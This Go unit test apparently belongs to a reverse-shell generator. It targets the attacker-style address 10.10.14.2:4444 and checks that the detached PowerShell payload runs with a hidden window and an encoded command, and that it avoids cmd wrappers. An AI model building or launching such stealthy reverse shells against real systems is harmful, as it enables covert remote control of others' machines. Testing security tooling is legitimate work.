package internal

import (
	"strings"
	"testing"
)

func TestGeneratePowerShellDetachedUsesStartProcess(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)
	payload := gen.GeneratePowerShellDetached()

	checks := []string{
		"Start-Process powershell",
		"-WindowStyle Hidden",
		"-ArgumentList @(",
		"-EncodedCommand",
		"| Out-Null",
	}

	for _, check := range checks {
		if !strings.Contains(payload, check) {
			t.Fatalf("expected detached payload to contain %q, got: %s", check, payload)
		}
	}
	if strings.Contains(payload, "cmd /c powershell -e") || strings.Contains(payload, "cmd /c start") {
		t.Fatalf("expected detached payload to avoid cmd launcher wrappers, got: %s", payload)
	}
}
